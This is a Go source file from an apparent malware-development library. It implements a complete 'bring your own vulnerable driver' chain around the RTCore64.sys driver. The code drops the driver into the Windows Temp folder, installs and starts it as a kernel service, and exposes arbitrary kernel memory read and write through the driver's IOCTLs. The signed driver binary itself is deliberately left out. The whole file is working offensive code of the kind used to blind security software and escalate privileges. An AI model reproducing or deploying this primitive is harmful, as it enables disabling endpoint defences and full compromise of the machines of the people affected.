//go:build windows

package rtcore64

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"

	"github.com/oioio-space/maldev/kernel/driver"
)

// ErrDriverBytesMissing is returned by Install when the caller did not
// embed RTCore64.sys via the byovd_rtcore64 build tag. The package
// ships every other piece of the BYOVD chain (service install, IOCTL,
// uninstall) but deliberately omits the signed driver to keep the
// open-source repo free of redistribution concerns.
var ErrDriverBytesMissing = errors.New("rtcore64: driver bytes not embedded; build with -tags=byovd_rtcore64")

// Driver is the RTCore64 BYOVD primitive. The zero value is ready to
// use; Install drops the driver, registers the service, and opens the
// device. ReadKernel / WriteKernel issue IOCTLs against the open
// device handle. Uninstall reverses the chain.
type Driver struct {
	servicePath string         // file dropped (e.g. C:\Windows\Temp\RTCore64.sys)
	device      windows.Handle // open handle to \\.\RTCore64
}

// Install drops the driver to disk, registers the service, starts it,
// and opens the device handle. Idempotent: a second Install on an
// already-loaded driver returns nil. Requires SeLoadDriverPrivilege —
// returns driver.ErrPrivilegeRequired on access denied.
func (d *Driver) Install() error {
	if d.device != 0 {
		return nil
	}
	bytes, err := loadDriverBytes()
	if err != nil {
		return err
	}
	dropPath, err := dropDriver(bytes)
	if err != nil {
		return fmt.Errorf("rtcore64: drop driver: %w", err)
	}
	d.servicePath = dropPath

	if err := installAndStartService(dropPath); err != nil {
		_ = os.Remove(dropPath)
		return err
	}

	device, err := openDevice()
	if err != nil {
		_ = stopAndDeleteService()
		_ = os.Remove(dropPath)
		return fmt.Errorf("rtcore64: open device: %w", err)
	}
	d.device = device
	return nil
}

// Uninstall closes the device handle, stops + deletes the service, and
// removes the dropped driver file. Best-effort: every step is attempted
// even if earlier steps failed, so partial state is always cleaned up.
// Returns the first error encountered (if any).
func (d *Driver) Uninstall() error {
	var firstErr error
	if d.device != 0 {
		if err := windows.CloseHandle(d.device); err != nil && firstErr == nil {
			firstErr = fmt.Errorf("rtcore64: close device: %w", err)
		}
		d.device = 0
	}
	if err := stopAndDeleteService(); err != nil && firstErr == nil {
		firstErr = err
	}
	if d.servicePath != "" {
		if err := os.Remove(d.servicePath); err != nil && !os.IsNotExist(err) && firstErr == nil {
			firstErr = fmt.Errorf("rtcore64: remove dropped driver: %w", err)
		}
		d.servicePath = ""
	}
	return firstErr
}

// Loaded reports whether the device handle is open. Mirrors
// kernel/driver.Lifecycle.Loaded.
func (d *Driver) Loaded() bool { return d.device != 0 }

// ReadKernel copies len(buf) bytes from kernel virtual address addr
// into buf using IoctlRead. Returns the number of bytes the IOCTL
// actually transferred (always len(buf) on success on RTCore64; the
// driver does not partial-fill).
func (d *Driver) ReadKernel(addr uintptr, buf []byte) (int, error) {
	if d.device == 0 {
		return 0, driver.ErrNotLoaded
	}
	if len(buf) == 0 {
		return 0, nil
	}
	if len(buf) > MaxPrimitiveBytes {
		return 0, fmt.Errorf("rtcore64: read length %d exceeds %d (loop in caller)", len(buf), MaxPrimitiveBytes)
	}
	in := struct {
		Address uint64
		Length  uint32
		_       uint32
	}{Address: uint64(addr), Length: uint32(len(buf))}
	var bytesReturned uint32
	if err := windows.DeviceIoControl(
		d.device, IoctlRead,
		(*byte)(unsafe.Pointer(&in)), uint32(unsafe.Sizeof(in)),
		&buf[0], uint32(len(buf)),
		&bytesReturned, nil,
	); err != nil {
		return 0, fmt.Errorf("rtcore64: IoctlRead at 0x%X: %w", addr, err)
	}
	return int(bytesReturned), nil
}

// WriteKernel writes data to kernel virtual address addr using
// IoctlWrite. RTCore64's write path takes the address followed by
// the bytes in a single input buffer; output is empty.
func (d *Driver) WriteKernel(addr uintptr, data []byte) (int, error) {
	if d.device == 0 {
		return 0, driver.ErrNotLoaded
	}
	if len(data) == 0 {
		return 0, nil
	}
	if len(data) > MaxPrimitiveBytes {
		return 0, fmt.Errorf("rtcore64: write length %d exceeds %d (loop in caller)", len(data), MaxPrimitiveBytes)
	}
	header := struct {
		Address uint64
		Length  uint32
		_       uint32
	}{Address: uint64(addr), Length: uint32(len(data))}
	in := make([]byte, int(unsafe.Sizeof(header))+len(data))
	*(*struct {
		Address uint64
		Length  uint32
		_       uint32
	})(unsafe.Pointer(&in[0])) = header
	copy(in[unsafe.Sizeof(header):], data)

	var bytesReturned uint32
	if err := windows.DeviceIoControl(
		d.device, IoctlWrite,
		&in[0], uint32(len(in)),
		nil, 0,
		&bytesReturned, nil,
	); err != nil {
		return 0, fmt.Errorf("rtcore64: IoctlWrite at 0x%X: %w", addr, err)
	}
	return len(data), nil
}

// dropDriver writes the embedded driver bytes to a temp file and
// returns its path. The caller must Remove the file during Uninstall.
func dropDriver(b []byte) (string, error) {
	dir := os.Getenv("WINDIR")
	if dir == "" {
		dir = `C:\Windows`
	}
	dropPath := filepath.Join(dir, "Temp", ServiceName+".sys")
	if err := os.WriteFile(dropPath, b, 0o644); err != nil {
		return "", err
	}
	return dropPath, nil
}

// installAndStartService registers RTCore64 as a SERVICE_KERNEL_DRIVER
// and starts it. Idempotent: returns nil if the service is already
// running. Maps SCM access denied to driver.ErrPrivilegeRequired.
func installAndStartService(binPath string) error {
	m, err := mgr.Connect()
	if err != nil {
		return mapSCMError(err, "OpenSCManager")
	}
	defer m.Disconnect()

	// Open existing or create new.
	s, err := m.OpenService(ServiceName)
	if err != nil {
		s, err = m.CreateService(ServiceName, binPath, mgr.Config{
			DisplayName: ServiceName,
			ServiceType: windows.SERVICE_KERNEL_DRIVER,
			StartType:   mgr.StartManual,
			ErrorControl: mgr.ErrorNormal,
		})
		if err != nil {
			return mapSCMError(err, "CreateService")
		}
	}
	defer s.Close()

	status, err := s.Query()
	if err != nil {
		return fmt.Errorf("rtcore64: query service: %w", err)
	}
	if status.State == svc.Running {
		return nil
	}
	if err := s.Start(); err != nil {
		// ERROR_SERVICE_ALREADY_RUNNING is benign.
		if !errors.Is(err, windows.ERROR_SERVICE_ALREADY_RUNNING) {
			return mapSCMError(err, "StartService")
		}
	}
	return nil
}

// stopAndDeleteService is the inverse of installAndStartService. Best
// effort: errors are returned but never block the next step.
func stopAndDeleteService() error {
	m, err := mgr.Connect()
	if err != nil {
		return mapSCMError(err, "OpenSCManager")
	}
	defer m.Disconnect()
	s, err := m.OpenService(ServiceName)
	if err != nil {
		// Already gone — not an error.
		return nil
	}
	defer s.Close()
	_, _ = s.Control(svc.Stop)
	_ = s.Delete()
	return nil
}

// openDevice returns a handle on \\.\RTCore64 with GENERIC_READ |
// GENERIC_WRITE access. The driver creates the symlink at start time
// — call after installAndStartService.
func openDevice() (windows.Handle, error) {
	pathW, err := windows.UTF16PtrFromString(DevicePath)
	if err != nil {
		return 0, err
	}
	h, err := windows.CreateFile(
		pathW,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return 0, err
	}
	return h, nil
}

// mapSCMError lifts SCM error codes to package-level sentinels so
// callers can switch on driver.ErrPrivilegeRequired etc.
func mapSCMError(err error, op string) error {
	if errors.Is(err, windows.ERROR_ACCESS_DENIED) {
		return fmt.Errorf("rtcore64: %s: %w", op, driver.ErrPrivilegeRequired)
	}
	return fmt.Errorf("rtcore64: %s: %w", op, err)
}
